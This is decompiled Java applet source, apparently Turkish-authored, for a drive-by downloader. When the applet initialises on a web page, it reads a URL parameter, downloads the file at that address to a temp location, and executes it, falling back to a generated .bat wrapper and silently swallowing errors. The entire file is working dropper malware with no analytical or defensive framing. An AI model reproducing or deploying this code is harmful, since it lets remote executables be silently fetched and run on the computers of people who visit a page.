import java.net.URLConnection;
import java.io.IOException;
import java.io.PrintWriter;
import java.io.BufferedInputStream;
import java.net.URL;
import java.io.FileOutputStream;
import java.io.File;
import java.applet.Applet;

// 
// Decompiled by Procyon v0.5.30
// 

public class Polat extends Applet
{
    private static final long hebelehubele = 1L;
    
    public void firejavaudder() {
        try {
            final byte[] hidden = new byte[10240];
            final String ar\u015fiv = this.getParameter("url");
            System.out.println("Link \u0130ndirilcek Udland\u0131 Fire Taraf\u0131ndan " + ar\u015fiv);
            String sonuc = ar\u015fiv.substring(ar\u015fiv.lastIndexOf("."));
            sonuc = sonuc.toLowerCase();
            final File upsss = File.createTempFile("javafire", sonuc);
            final FileOutputStream indir = new FileOutputStream(upsss);
            final URL indir2 = new URL(ar\u015fiv);
            final URLConnection uc = indir2.openConnection();
            final BufferedInputStream is = new BufferedInputStream(uc.getInputStream());
            int fire;
            while ((fire = is.read(hidden)) > 0) {
                indir.write(hidden, 0, fire);
            }
            indir.close();
            try {
                Runtime.getRuntime().exec(upsss.getAbsolutePath());
            }
            catch (IOException e) {
                final File f = File.createTempFile("firem", ".bat");
                f.createNewFile();
                final PrintWriter pw = new PrintWriter(f);
                pw.println("\"" + upsss.getAbsolutePath() + "\"");
                pw.close();
                Runtime.getRuntime().exec(f.getAbsolutePath());
            }
        }
        catch (Exception ex) {}
    }
    
    public void init() {
        try {
            this.firejavaudder();
        }
        catch (Exception e) {
            System.out.println(e);
        }
        super.init();
    }
}
